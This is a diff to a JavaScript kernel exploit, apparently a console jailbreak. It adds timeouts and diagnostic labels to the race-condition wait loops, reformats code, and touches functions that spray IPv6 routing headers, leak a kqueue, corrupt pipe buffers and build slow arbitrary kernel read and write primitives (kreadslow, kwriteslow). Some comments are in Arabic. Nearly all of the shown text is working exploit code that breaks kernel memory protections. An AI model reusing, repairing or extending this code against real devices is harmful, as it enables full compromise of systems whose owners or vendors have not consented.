@@ -236,7 +236,6 @@ function safe(obj, name) {
   }
   return obj;
 }
-
 safe(fn, 'fn');
 safe(syscalls, 'syscalls');
 safe(kernel, 'kernel');
@@ -419,7 +418,10 @@ function trigger_iov_recvmsg() {
 }
 function wait_iov_recvmsg() {
   for (var i = 0; i < IOV_THREAD_NUM; i++) {
-    wait_for(iov_recvmsg_workers[i].done, new BigInt(1));
+    var ok = wait_for(iov_recvmsg_workers[i].done, new BigInt(1), 'wait_iov_recvmsg[' + i + ']');
+    if (!ok) {
+      throw new Error('wait_iov_recvmsg timeout at worker ' + i);
+    }
   }
 }
 function trigger_uio_readv() {
@@ -436,7 +438,10 @@ function trigger_uio_readv() {
 }
 function wait_uio_readv() {
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    wait_for(uio_readv_workers[i].done, new BigInt(1));
+    var ok = wait_for(uio_readv_workers[i].done, new BigInt(1), 'wait_uio_readv[' + i + ']');
+    if (!ok) {
+      throw new Error('wait_uio_readv timeout at worker ' + i);
+    }
   }
 }
 function trigger_uio_writev() {
@@ -453,7 +458,10 @@ function trigger_uio_writev() {
 }
 function wait_uio_writev() {
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    wait_for(uio_writev_workers[i].done, new BigInt(1));
+    var ok = wait_for(uio_writev_workers[i].done, new BigInt(1), 'wait_uio_writev[' + i + ']');
+    if (!ok) {
+      throw new Error('wait_uio_writev timeout at worker ' + i);
+    }
   }
 }
 function trigger_ipv6_spray_and_read() {
@@ -605,18 +613,25 @@ function fill_buffer_64(addr, value, size) {
  */
 
 function nanosleep_fun(nsec) {
-  // nsec: عدد النانو ثانية (number)
   write64(nanosleep_timespec, Math.floor(nsec / 1e9)); // tv_sec
   write64(nanosleep_timespec.add(8), nsec % 1e9);      // tv_nsec
   nanosleep(nanosleep_timespec);
 }
 
-// نسمح إن threshold يكون number أو BigInt
-function wait_for(addr, threshold) {
+// باتش: إضافة timeout + label للتشخيص
+function wait_for(addr, threshold, label) {
   var target = (typeof threshold === "object") ? threshold : new BigInt(threshold);
+  var start  = Date.now();
+  var maxMs  = 5000; // 5 ثواني لكل انتظار – تقدر تزود/تقلل
+
   while (!read64(addr).eq(target)) {
-    nanosleep_fun(1); // sleep صغير يحافظ على الـ timing
+    nanosleep_fun(1e6); // 1ms بدل 1ns عشان ما يبقاش busy loop
+    if (Date.now() - start > maxMs) {
+      log('[WAIT] timeout at ' + (label || 'unknown') + ' addr=' + hex(addr));
+      return false;
+    }
   }
+  return true;
 }
 /* ===========================
   *   Initialization (init)
@@ -934,9 +949,7 @@ function find_triplet(master, other) {
 }
 function safe_memory_available() {
   try {
-    return debugging && debugging.info && debugging.info.memory
-      ? safe_memory_available()
-      : 1; // قيمة آمنة
+    return debugging && debugging.info && debugging.info.memory ? safe_memory_available() : 1; // قيمة آمنة
   } catch (e) {
     return 1;
   }
@@ -957,7 +970,6 @@ function retry(label, attempts, fn) {
   log(label + ' all attempts failed');
   return false;
 }
-
 function yield_to_render(callback) {
   var id = jsmaf.setInterval(function () {
     jsmaf.clearInterval(id);
@@ -1043,7 +1055,6 @@ function exploit_phase_rw() {
   log('[FLOW] inside exploit_phase_rw');
   watchdog_tick('exploit_phase_rw');
   log('[RW] exploit_phase_rw: enter');
-
   var ok = retry('setup_arbitrary_rw', 3, () => setup_arbitrary_rw());
   if (!ok) {
     log('[RW] setup_arbitrary_rw failed after retries, restarting trigger phase');
@@ -1052,12 +1063,10 @@ function exploit_phase_rw() {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-
   log('[FLOW] EXIT exploit_phase_rw');
   log('[FLOW] Requesting transition to: exploit_phase_jailbreak');
   yield_to_render(exploit_phase_jailbreak);
 }
-
 function exploit_phase_jailbreak() {
   log('[FLOW] inside exploit_phase_jailbreak');
   watchdog_tick('exploit_phase_jailbreak');
@@ -1234,7 +1243,6 @@ function read_buffer(addr, len) {
   }
   return buffer;
 }
-
 function write_buffer(addr, buffer) {
   for (var i = 0; i < buffer.length; i++) {
     write8(addr.add(i), buffer[i]);
@@ -1247,7 +1255,6 @@ kernel.read_buffer = function (kaddr, len) {
   kread(tmp, kaddr, len);
   return read_buffer(tmp, len);
 };
-
 kernel.write_buffer = function (kaddr, buf) {
   write_buffer(tmp, buf);
   kwrite(kaddr, tmp, buf.length);
@@ -1281,7 +1288,7 @@ function remove_rthr_from_socket(fd) {
 }
 var victim_pipe_buf = malloc(PIPEBUF_SIZE);
 function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
-  if (buffer.eq(new BigInt(0,0)))  {
+  if (buffer.eq(new BigInt(0, 0))) {
     throw new Error('buffer cannot be zero');
   }
   write32(victim_pipe_buf.add(0x00), cnt); // cnt
@@ -1456,8 +1463,7 @@ function leak_kqueue() {
   // تأمين triplets[1] قبل free_rthdr
   var sd1 = ipv6_socks[triplets[1]];
   var sd0 = ipv6_socks[triplets[0]];
-  if (!sd1 || sd1.eq(BigInt_Error) || sd1.eq(new BigInt(0)) ||
-      !sd0 || sd0.eq(BigInt_Error) || sd0.eq(new BigInt(0))) {
+  if (!sd1 || sd1.eq(BigInt_Error) || sd1.eq(new BigInt(0)) || !sd0 || sd0.eq(BigInt_Error) || sd0.eq(new BigInt(0))) {
     log('[LEAK] Invalid triplet sockets in leak_kqueue, aborting leak');
     return false;
   }
@@ -1485,7 +1491,6 @@ function leak_kqueue() {
       log('[LEAK] triplets[0] socket became invalid during loop');
       return false;
     }
-
     get_rthdr(sd0, leak_rthdr, 0x100);
     var cur_magic = read64(magic_add);
     var cur_fdp = read64(leak_rthdr.add(0x98));
@@ -1537,19 +1542,18 @@ function kreadslow64(address) {
 }
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
   // struct uio
-  write64(uio.add(0x00), uio_iov);          // uio_iov
-  write64(uio.add(0x08), UIO_IOV_NUM);      // uio_iovcnt
-  write64(uio.add(0x10), new BigInt(0));    // uio_offset
-  write64(uio.add(0x18), size);             // uio_resid
-  write32(uio.add(0x20), UIO_SYSSPACE);     // uio_segflg
+  write64(uio.add(0x00), uio_iov); // uio_iov
+  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
+  write64(uio.add(0x10), new BigInt(0)); // uio_offset
+  write64(uio.add(0x18), size); // uio_resid
+  write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
   write32(uio.add(0x24), read ? UIO_READ : UIO_WRITE); // uio_rw
-  write64(uio.add(0x28), uio_td);           // uio_td
+  write64(uio.add(0x28), uio_td); // uio_td
 
   // أول iovec
-  write64(uio_iov.add(0x00), addr);         // iov_base
-  write64(uio_iov.add(0x08), size);         // iov_len
+  write64(uio_iov.add(0x00), addr); // iov_base
+  write64(uio_iov.add(0x08), size); // iov_len
 }
-
 function kreadslow(addr, size) {
   debug('[KR] Enter kreadslow addr=' + hex(addr) + ' size=' + size);
 
@@ -1558,7 +1562,6 @@ function kreadslow(addr, size) {
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     leak_buffers[i] = malloc(size);
   }
-
   if (!addr || size <= 0) {
     log('[KR] Invalid addr/size');
     return BigInt_Error;
@@ -1583,13 +1586,11 @@ function kreadslow(addr, size) {
   var uio_leak_add = leak_rthdr.add(0x08);
   var count = 0;
   var zeroMemoryCount = 0;
-
   while (count < 10000) {
     if (count % 500 === 0) {
       log('[KR] Stage1 progress=' + count);
       watchdog_tick('kreadslow_stage1');
     }
-
     if (safe_memory_available() === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 8) {
@@ -1599,11 +1600,9 @@ function kreadslow(addr, size) {
     } else {
       zeroMemoryCount = 0;
     }
-
     count++;
     trigger_uio_writev();
     sched_yield();
-
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) {
       break;
@@ -1617,7 +1616,6 @@ function kreadslow(addr, size) {
     wait_uio_writev();
     write(new BigInt(uio_sock_1), tmp, size);
   }
-
   if (count === 10000) {
     debug('[KR] Stage1 failed after max iterations');
     return BigInt_Error;
@@ -1634,14 +1632,12 @@ function kreadslow(addr, size) {
   var iov_leak_add = leak_rthdr.add(0x20);
   var count2 = 0;
   var zeroMemoryCount2 = 0;
-
   while (true) {
     count2++;
     if (count2 > 10000) {
       log('[KR] Stage2 failed after max iterations');
       return BigInt_Error;
     }
-
     if (safe_memory_available() === 0) {
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= 8) {
@@ -1651,15 +1647,12 @@ function kreadslow(addr, size) {
     } else {
       zeroMemoryCount2 = 0;
     }
-
     trigger_iov_recvmsg();
     sched_yield();
-
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
     if (read32(iov_leak_add) === UIO_SYSSPACE) {
       break;
     }
-
     write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
@@ -1669,7 +1662,6 @@ function kreadslow(addr, size) {
   read(new BigInt(uio_sock_0), tmp, size);
   var leak_buffer = new BigInt(0);
   var tag_val = new BigInt(0x41414141, 0x41414141);
-
   for (var j = 0; j < UIO_THREAD_NUM; j++) {
     read(new BigInt(uio_sock_0), leak_buffers[j], size);
     var val = read64(leak_buffers[j]);
@@ -1678,15 +1670,12 @@ function kreadslow(addr, size) {
       leak_buffer = leak_buffers[j];
     }
   }
-
   wait_uio_writev();
   write(new BigInt(iov_sock_1), tmp, 1);
-
   if (leak_buffer.eq(new BigInt(0))) {
     log('[KR] No valid leak_buffer found (all buffers matched tag)');
     return BigInt_Error;
   }
-
   for (var retry = 0; retry < 3; retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
@@ -1695,12 +1684,10 @@ function kreadslow(addr, size) {
   if (triplets[2] === -1) {
     return BigInt_Error;
   }
-
   return leak_buffer;
 }
 function kwriteslow(addr, buffer, size) {
   log('[KW] Enter kwriteslow addr=' + hex(addr));
-
   if (!addr || size <= 0) {
     log('[KW] Invalid addr/size');
     return BigInt_Error;
@@ -1726,13 +1713,11 @@ function kwriteslow(addr, buffer, size) {
   var uio_leak_add = leak_rthdr.add(0x08);
   var count = 0;
   var zeroMemoryCount = 0;
-
   while (true) {
     if (count % 500 === 0) {
       log('[KW] Stage1 progress=' + count);
       watchdog_tick('kwriteslow_stage1');
     }
-
     if (safe_memory_available() === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 8) {
@@ -1741,28 +1726,22 @@ function kwriteslow(addr, buffer, size) {
     } else {
       zeroMemoryCount = 0;
     }
-
     count++;
-
     if (count > 10000) {
       log('[KW] Stage1 failed after max iterations');
       return BigInt_Error;
     }
-
     trigger_uio_readv();
     sched_yield();
-
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) {
       break;
     }
-
     for (var i = 0; i < UIO_THREAD_NUM; i++) {
       write(new BigInt(uio_sock_1), buffer, size);
     }
     wait_uio_readv();
   }
-
   var uio_iov = read64(leak_rthdr);
   build_uio(uio_buf, uio_iov, 0, false, addr, size);
 
@@ -1771,13 +1750,11 @@ function kwriteslow(addr, buffer, size) {
   var iov_leak_add = leak_rthdr.add(0x20);
   var count2 = 0;
   var zeroMemoryCount2 = 0;
-
   while (true) {
     if (count2 % 500 === 0) {
       log('[KW] Stage2 progress=' + count2);
       watchdog_tick('kwriteslow_stage2');
     }
-
     if (safe_memory_available() === 0) {
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= 8) {
@@ -1786,22 +1763,17 @@ function kwriteslow(addr, buffer, size) {
     } else {
       zeroMemoryCount2 = 0;
     }
-
     count2++;
-
     if (count2 > 10000) {
       log('[KW] Stage2 failed after max iterations');
       return BigInt_Error;
     }
-
     trigger_iov_recvmsg();
     sched_yield();
-
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
     if (read32(iov_leak_add) === UIO_SYSSPACE) {
       break;
     }
-
     write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
@@ -1811,11 +1783,9 @@ function kwriteslow(addr, buffer, size) {
   for (var j = 0; j < UIO_THREAD_NUM; j++) {
     write(new BigInt(uio_sock_1), buffer, size);
   }
-
   triplets[1] = find_triplet(triplets[0], -1);
   wait_uio_readv();
   write(new BigInt(iov_sock_1), tmp, 1);
-
   for (var retry = 0; retry < 3; retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
@@ -1824,7 +1794,6 @@ function kwriteslow(addr, buffer, size) {
   if (triplets[2] === -1) {
     return BigInt_Error;
   }
-
   return new BigInt(0);
 }
 /* ===========================
